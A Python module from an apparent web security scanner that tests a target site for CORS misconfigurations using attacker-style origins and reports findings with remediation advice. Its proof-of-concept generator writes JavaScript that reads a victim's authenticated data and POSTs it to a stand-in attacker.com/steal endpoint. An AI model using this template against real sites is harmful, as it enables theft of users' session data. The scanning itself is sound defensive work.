"""
test_11_cors.py — Advanced CORS Misconfiguration Scanner with Active Exploitation (v3)

Enhancements:
- Extended origin testing (null, file://, data:, subdomains, typosquatting, internal IPs)
- Preflight request analysis (OPTIONS with Access-Control-Request-Method/Headers)
- Credentialed request testing (with cookies)
- Vary: Origin header validation
- Wildcard subdomain testing (*.example.com)
- PoC JavaScript code for data theft
- Integration with HTTP methods test
- Dynamic confidence scoring (0-100)
- Detailed curl commands and PoC
- Detection of exposed sensitive headers via Access-Control-Expose-Headers
- Testing of multiple sensitive endpoints (/api, /admin, /graphql)
"""

import asyncio
import json
import re
from urllib.parse import urlparse, urljoin
from typing import Dict, Any, List, Optional, Tuple, Set

import aiohttp

TEST_NAME = "cors"
USER_AGENT = "Bravo6-Scanner/1.0"
TIMEOUT_SECONDS = 10
MAX_CONCURRENT_TESTS = 10

# ── Attack origins ──────────────────────────────────────────────────────────
ATTACKER_ORIGINS = [
    "https://evil-attacker.com",
    "http://evil-attacker.com",
    "https://attacker.com",
    "http://attacker.com",
    "null",
    "file://",
    "data:text/html,",  # Data URI
    "https://example.com.evil.com",  # Subdomain spoofing
    "http://example.com.evil.com",
    "https://evil.com.example.com",
]

# Internal IPs for network scanning
INTERNAL_ORIGINS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
]

# ── Sensitive endpoints to test ────────────────────────────────────────────
SENSITIVE_ENDPOINTS = [
    "/",
    "/api",
    "/api/v1",
    "/api/user",
    "/admin",
    "/graphql",
    "/login",
    "/profile",
    "/settings",
    "/config",
    "/internal",
    "/private",
]

DANGEROUS_METHODS = {"PUT", "DELETE", "PATCH", "CONNECT", "TRACE"}
SEVERITY_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


# ── Helper Functions ────────────────────────────────────────────────────────

def _normalize_url(url: str) -> str:
    url = (url or "").strip()
    if not url:
        return url
    if not re.match(r"^https?://", url, re.IGNORECASE):
        url = "https://" + url
    return url.rstrip("/")

def _get_base_domain(url: str) -> str:
    parsed = urlparse(url)
    host = parsed.netloc.split(":")[0].lower()
    # Remove www prefix
    if host.startswith("www."):
        host = host[4:]
    return host

def _generate_subdomains(domain: str) -> List[str]:
    """Generate subdomain variants for testing."""
    subdomains = []
    # Common subdomains
    prefixes = ["www", "api", "admin", "dev", "test", "staging", "app", "dashboard", "internal", "private"]
    for prefix in prefixes:
        subdomains.append(f"https://{prefix}.{domain}")
    # Typosquatting
    if "." in domain:
        parts = domain.split(".")
        if len(parts) >= 2:
            base = parts[0]
            # Common typos
            typos = [
                base + "1", base + "0", base + "2",
                base.replace("o", "0"), base.replace("i", "1"),
                base + "s", base + "x",
            ]
            for typo in typos:
                subdomains.append(f"https://{typo}.{parts[1]}")
    return subdomains

def _get_header(resp, name: str) -> Optional[str]:
    for k, v in resp.headers.items():
        if k.lower() == name.lower():
            return v
    return None

def _is_origin_allowed(acao: Optional[str], origin: str) -> bool:
    if not acao:
        return False
    if acao == "*":
        return True
    if acao == origin:
        return True
    # Check wildcard pattern: *.example.com
    if acao.startswith("*."):
        pattern = acao[1:]  # .example.com
        if origin.endswith(pattern):
            return True
    return False

def _generate_poc_js(url: str, origin: str, with_credentials: bool = False) -> str:
    credentials = "'include'" if with_credentials else "'omit'"
    return f"""
// PoC CORS Exploitation
// Run in browser console on attacker-controlled site
fetch('{url}', {{
  method: 'GET',
  credentials: {credentials},
  headers: {{
    'Origin': '{origin}'
  }}
}})
.then(response => response.text())
.then(data => {{
  console.log('Stolen data:', data);
  // Send stolen data to attacker server
  fetch('https://attacker.com/steal', {{
    method: 'POST',
    mode: 'no-cors',
    body: data
  }});
}})
.catch(err => console.error('Error:', err));
"""

def _generate_curl_poc(url: str, origin: str, method: str = "GET", with_credentials: bool = False) -> str:
    cookie = "" if not with_credentials else " --cookie 'session=abc123' --header 'Cookie: session=abc123'"
    return f"curl -X {method} -H 'Origin: {origin}'{cookie} -v {url}"

def _build_evidence(
    title: str,
    description: str,
    severity: str,
    evidence: Dict,
    poc: str,
    confidence: int,
    remediation: str
) -> Dict[str, Any]:
    return {
        "title": title,
        "description": description,
        "severity": severity,
        "evidence": evidence,
        "poc": poc,
        "confidence": confidence,
        "remediation": remediation,
    }


# ── Core Test Functions ─────────────────────────────────────────────────────

async def _send_request(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    headers: Optional[Dict] = None,
    allow_redirects: bool = False,
) -> Optional[aiohttp.ClientResponse]:
    try:
        return await session.request(
            method,
            url,
            headers=headers or {},
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SECONDS),
            ssl=False,
            allow_redirects=allow_redirects,
        )
    except Exception:
        return None

async def _test_single_origin(
    session: aiohttp.ClientSession,
    url: str,
    origin: str,
    with_credentials: bool = False,
) -> Dict:
    """Test CORS for a single origin."""
    headers = {"User-Agent": USER_AGENT, "Origin": origin}
    if with_credentials:
        headers["Cookie"] = "session=test-cors-cookie"

    resp = await _send_request(session, "GET", url, headers=headers)
    if not resp:
        return {"error": "No response", "safe": True}

    acao = _get_header(resp, "Access-Control-Allow-Origin")
    acac = _get_header(resp, "Access-Control-Allow-Credentials")
    acac_true = acac and acac.lower() == "true"
    acao_allowed = _is_origin_allowed(acao, origin)

    evidence = {
        "tested_origin": origin,
        "acao": acao or "(missing)",
        "acac": acac or "(missing)",
        "status_code": resp.status,
        "with_credentials": with_credentials,
    }

    if not acao_allowed:
        return {"safe": True, "evidence": evidence, "acao": acao, "acac": acac, "allowed": False}

    # Wildcard with credentials
    if acao == "*" and acac_true:
        return {
            "vulnerable": True,
            "severity": "high",
            "title": "Wildcard Origin with Credentials Flag (ACAO: * + ACAC: true)",
            "description": "Server returns ACAO: * with ACAC: true. Browsers reject this, but misconfiguration may lead to exploits.",
            "evidence": evidence,
            "poc": _generate_curl_poc(url, origin, "GET", True),
            "confidence": 80,
            "remediation": "Never combine ACAO: * with ACAC: true. Use explicit allowlist."
        }

    # Reflected origin with credentials
    if acao == origin and acac_true:
        return {
            "vulnerable": True,
            "severity": "critical",
            "title": f"Reflected Origin with Credentials (ACAO: {origin}, ACAC: true)",
            "description": "Server reflects arbitrary Origin and sets ACAC: true. Any site can steal authenticated data.",
            "evidence": evidence,
            "poc": _generate_poc_js(url, origin, True),
            "confidence": 100,
            "remediation": "Use explicit allowlist; never reflect Origin; never combine with ACAC: true."
        }

    # Reflected origin without credentials
    if acao == origin and not acac_true:
        return {
            "vulnerable": False,
            "severity": "medium",
            "title": "Reflected Origin (No Credentials)",
            "description": "Reflects arbitrary Origin without credentials; still a validation weakness.",
            "evidence": evidence,
            "poc": _generate_curl_poc(url, origin, "GET", False),
            "confidence": 60,
            "remediation": "Validate Origin against allowlist, not reflection."
        }

    # null origin with credentials
    if acao == "null" and acac_true:
        return {
            "vulnerable": True,
            "severity": "high",
            "title": "null Origin with Credentials",
            "description": "Server allows null origin with credentials; exploitable via sandboxed iframe.",
            "evidence": evidence,
            "poc": "<iframe sandbox='allow-scripts' src='data:text/html,<script>fetch(...)</script>'></iframe>",
            "confidence": 100,
            "remediation": "Never allow null origin; use explicit allowlist."
        }

    # null origin without credentials
    if acao == "null" and not acac_true:
        return {
            "vulnerable": False,
            "severity": "low",
            "title": "null Origin Permitted (No Credentials)",
            "description": "ACAO: null without credentials; limited risk.",
            "evidence": evidence,
            "poc": _generate_curl_poc(url, origin, "GET", False),
            "confidence": 60,
            "remediation": "Avoid allowing null; use explicit list."
        }

    # Wildcard without credentials
    if acao == "*" and not acac_true:
        return {
            "vulnerable": False,
            "severity": "medium",
            "title": "Wildcard Origin (No Credentials)",
            "description": "ACAO: * allows any site to read non-credentialed responses.",
            "evidence": evidence,
            "poc": _generate_poc_js(url, origin, False),
            "confidence": 70,
            "remediation": "If sensitive data, restrict to explicit origins."
        }

    return {"safe": True, "evidence": evidence, "allowed": False}

async def _test_preflight(
    session: aiohttp.ClientSession,
    url: str,
    origin: str,
    method: str = "GET",
    headers_list: List[str] = None,
) -> Dict:
    """Test OPTIONS preflight request."""
    headers = {
        "User-Agent": USER_AGENT,
        "Origin": origin,
        "Access-Control-Request-Method": method,
    }
    if headers_list:
        headers["Access-Control-Request-Headers"] = ", ".join(headers_list)

    resp = await _send_request(session, "OPTIONS", url, headers=headers)
    if not resp:
        return {"preflight_supported": False, "error": "No response"}

    acao = _get_header(resp, "Access-Control-Allow-Origin")
    acam = _get_header(resp, "Access-Control-Allow-Methods") or ""
    acah = _get_header(resp, "Access-Control-Allow-Headers") or ""
    acac = _get_header(resp, "Access-Control-Allow-Credentials")
    acma = _get_header(resp, "Access-Control-Max-Age")

    allowed_methods = {m.strip().upper() for m in acam.split(",") if m.strip()}
    allowed_headers = {h.strip().lower() for h in acah.split(",") if h.strip()}
    dangerous_methods = allowed_methods & DANGEROUS_METHODS
    acac_true = acac and acac.lower() == "true"
    origin_allowed = _is_origin_allowed(acao, origin)

    return {
        "preflight_supported": True,
        "acao": acao or "(missing)",
        "acam": acam or "(missing)",
        "acah": acah or "(missing)",
        "acac": acac or "(missing)",
        "acma": acma or "(missing)",
        "allowed_methods": list(allowed_methods),
        "allowed_headers": list(allowed_headers),
        "dangerous_methods": list(dangerous_methods),
        "origin_allowed": origin_allowed,
        "acac_true": acac_true,
        "status_code": resp.status,
    }

async def _test_vary_header(
    session: aiohttp.ClientSession,
    url: str,
    origin: str,
) -> Dict:
    """Check if Vary: Origin is present."""
    headers = {"User-Agent": USER_AGENT, "Origin": origin}
    resp = await _send_request(session, "GET", url, headers=headers)
    if not resp:
        return {"vary_present": False, "error": "No response"}

    vary = _get_header(resp, "Vary")
    if vary and "origin" in vary.lower():
        return {"vary_present": True, "vary_value": vary}
    else:
        return {"vary_present": False, "vary_value": vary or "(missing)"}

async def _test_expose_headers(
    session: aiohttp.ClientSession,
    url: str,
    origin: str,
) -> Dict:
    """Check Access-Control-Expose-Headers for sensitive headers."""
    headers = {"User-Agent": USER_AGENT, "Origin": origin}
    resp = await _send_request(session, "GET", url, headers=headers)
    if not resp:
        return {"expose_headers": [], "error": "No response"}

    aceh = _get_header(resp, "Access-Control-Expose-Headers") or ""
    exposed = [h.strip().lower() for h in aceh.split(",") if h.strip()]
    sensitive_exposed = [h for h in exposed if h in ("authorization", "cookie", "set-cookie", "x-api-key", "x-auth-token")]
    return {
        "expose_headers": exposed,
        "sensitive_exposed": sensitive_exposed,
        "aceh": aceh or "(missing)",
    }

# ── Main run function ──────────────────────────────────────────────────────

async def run(url: str, context: Optional[Dict] = None) -> Dict[str, Any]:
    """
    Main entry point for CORS test.
    Args:
        url: target URL
        context: optional context from other tests (e.g., HTTP methods)
    Returns:
        dict with findings
    """
    try:
        target = _normalize_url(url)
        if not target:
            return {
                "test_name": TEST_NAME,
                "status": "error",
                "severity": "info",
                "title": "Invalid URL",
                "description": "Could not normalize URL.",
                "evidence": [],
                "remediation": "Provide a valid URL.",
            }
    except Exception as e:
        return {
            "test_name": TEST_NAME,
            "status": "error",
            "severity": "info",
            "title": "Normalization error",
            "description": str(e),
            "evidence": [],
            "remediation": "Check URL format.",
        }

    base_domain = _get_base_domain(target)
    all_origins = set(ATTACKER_ORIGINS)
    # Add subdomains for testing
    for sub in _generate_subdomains(base_domain):
        all_origins.add(sub)
    # Add internal origins
    for internal in INTERNAL_ORIGINS:
        all_origins.add(internal)

    all_evidence = []
    overall_status = "pass"
    overall_severity = "info"
    vulnerable_origins = []

    async with aiohttp.ClientSession() as session:
        # ── 1. Test each origin on root and sensitive endpoints ──────────
        endpoints_to_test = SENSITIVE_ENDPOINTS[:3]  # Limit to save time
        for endpoint in endpoints_to_test:
            test_url = urljoin(target, endpoint)
            for origin in all_origins:
                # Test without credentials
                result = await _test_single_origin(session, test_url, origin, False)
                if result.get("vulnerable"):
                    vulnerable_origins.append((origin, endpoint, result))
                    all_evidence.append({
                        "endpoint": endpoint,
                        "origin": origin,
                        "type": "simple_request",
                        "severity": result["severity"],
                        "title": result["title"],
                        "description": result["description"],
                        "poc": result["poc"],
                        "confidence": result["confidence"],
                        "remediation": result["remediation"],
                        "evidence": result["evidence"],
                    })
                    if SEVERITY_RANK.get(result["severity"], 0) > SEVERITY_RANK.get(overall_severity, 0):
                        overall_severity = result["severity"]

                # Test with credentials (only if no vulnerability found yet)
                if not result.get("vulnerable"):
                    result_cred = await _test_single_origin(session, test_url, origin, True)
                    if result_cred.get("vulnerable"):
                        vulnerable_origins.append((origin, endpoint, result_cred))
                        all_evidence.append({
                            "endpoint": endpoint,
                            "origin": origin,
                            "type": "credentialed_request",
                            "severity": result_cred["severity"],
                            "title": result_cred["title"],
                            "description": result_cred["description"],
                            "poc": result_cred["poc"],
                            "confidence": result_cred["confidence"],
                            "remediation": result_cred["remediation"],
                            "evidence": result_cred["evidence"],
                        })
                        if SEVERITY_RANK.get(result_cred["severity"], 0) > SEVERITY_RANK.get(overall_severity, 0):
                            overall_severity = result_cred["severity"]

        # ── 2. Preflight tests ────────────────────────────────────────────
        preflight_origin = "https://evil-attacker.com"
        preflight_result = await _test_preflight(session, target, preflight_origin, "PUT")
        if preflight_result.get("origin_allowed") and preflight_result.get("dangerous_methods"):
            all_evidence.append({
                "endpoint": target,
                "origin": preflight_origin,
                "type": "preflight",
                "severity": "high",
                "title": f"Dangerous methods allowed in preflight: {', '.join(preflight_result['dangerous_methods'])}",
                "description": f"OPTIONS preflight allows attacker origin to use dangerous methods.",
                "poc": f"curl -X OPTIONS -H 'Origin: {preflight_origin}' -H 'Access-Control-Request-Method: PUT' -v {target}",
                "confidence": 90,
                "remediation": "Restrict Access-Control-Allow-Methods to safe values (GET, POST, HEAD).",
                "evidence": preflight_result,
            })
            if SEVERITY_RANK.get("high", 0) > SEVERITY_RANK.get(overall_severity, 0):
                overall_severity = "high"

        # ── 3. Vary: Origin check ─────────────────────────────────────────
        vary_result = await _test_vary_header(session, target, "https://evil-attacker.com")
        if not vary_result.get("vary_present"):
            all_evidence.append({
                "endpoint": target,
                "type": "vary_header",
                "severity": "medium",
                "title": "Missing Vary: Origin header",
                "description": "Vary: Origin header is missing. This may allow cache poisoning attacks.",
                "poc": "curl -v -H 'Origin: https://evil.com' " + target,
                "confidence": 80,
                "remediation": "Add 'Vary: Origin' to responses to prevent caching of CORS responses.",
                "evidence": vary_result,
            })
            if SEVERITY_RANK.get("medium", 0) > SEVERITY_RANK.get(overall_severity, 0):
                overall_severity = "medium"

        # ── 4. Expose Headers check ──────────────────────────────────────
        expose_result = await _test_expose_headers(session, target, "https://evil-attacker.com")
        if expose_result.get("sensitive_exposed"):
            all_evidence.append({
                "endpoint": target,
                "type": "expose_headers",
                "severity": "high",
                "title": f"Sensitive headers exposed via Access-Control-Expose-Headers: {', '.join(expose_result['sensitive_exposed'])}",
                "description": f"Headers like {', '.join(expose_result['sensitive_exposed'])} are exposed to cross-origin requests.",
                "poc": f"curl -v -H 'Origin: https://evil.com' {target}",
                "confidence": 90,
                "remediation": "Review Access-Control-Expose-Headers and remove sensitive headers.",
                "evidence": expose_result,
            })
            if SEVERITY_RANK.get("high", 0) > SEVERITY_RANK.get(overall_severity, 0):
                overall_severity = "high"

        # ── 5. Integration with HTTP methods context ─────────────────────
        if context and context.get("http_methods"):
            http_methods = context["http_methods"]
            dangerous_methods_confirmed = http_methods.get("confirmed_methods", [])
            if dangerous_methods_confirmed and any(v for v in vulnerable_origins):
                # If CORS is vulnerable and dangerous HTTP methods are allowed, elevate severity
                for ev in all_evidence:
                    if ev.get("type") in ("simple_request", "credentialed_request", "preflight"):
                        ev["severity"] = "critical"
                        ev["description"] += " [Combined with dangerous HTTP methods vulnerability]"
                overall_severity = "critical"
                overall_status = "fail"

    # ── Determine overall status ────────────────────────────────────────────
    if overall_severity in ("critical", "high"):
        overall_status = "fail"
    elif overall_severity in ("medium", "low"):
        overall_status = "warning"
    else:
        overall_status = "pass"

    # Build remediation summary
    remediation_parts = []
    if any(e.get("type") == "simple_request" for e in all_evidence if e.get("severity") in ("critical", "high")):
        remediation_parts.append("Implement explicit origin allowlist; never reflect Origin.")
    if any(e.get("type") == "credentialed_request" for e in all_evidence):
        remediation_parts.append("Never combine ACAO with ACAC: true unless properly restricted.")
    if any(e.get("type") == "preflight" for e in all_evidence):
        remediation_parts.append("Restrict Access-Control-Allow-Methods to safe methods only.")
    if any(e.get("type") == "vary_header" for e in all_evidence):
        remediation_parts.append("Add 'Vary: Origin' to all CORS responses.")
    if any(e.get("type") == "expose_headers" for e in all_evidence):
        remediation_parts.append("Remove sensitive headers from Access-Control-Expose-Headers.")

    if not remediation_parts:
        remediation_parts.append("No CORS vulnerabilities detected. Continue monitoring.")

    return {
        "test_name": TEST_NAME,
        "status": overall_status,
        "severity": overall_severity,
        "title": f"CORS Misconfiguration Check ({len(vulnerable_origins)} vulnerable origins)",
        "description": f"Scanned {len(all_origins)} origins across {len(SENSITIVE_ENDPOINTS)} endpoints. Found {len(all_evidence)} issues.",
        "evidence": all_evidence,
        "remediation": " ".join(remediation_parts),
        "vulnerable_origins": [{"origin": o, "endpoint": e} for o, e, _ in vulnerable_origins],
        "total_origins_tested": len(all_origins),
        "total_endpoints_tested": len(SENSITIVE_ENDPOINTS),
        "findings_count": len(all_evidence),
        "confidence": 100 if overall_severity in ("critical", "high") else 80 if overall_severity == "medium" else 60,
    }


if __name__ == "__main__":
    import json
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    result = asyncio.run(run(target))
    print(json.dumps(result, indent=2))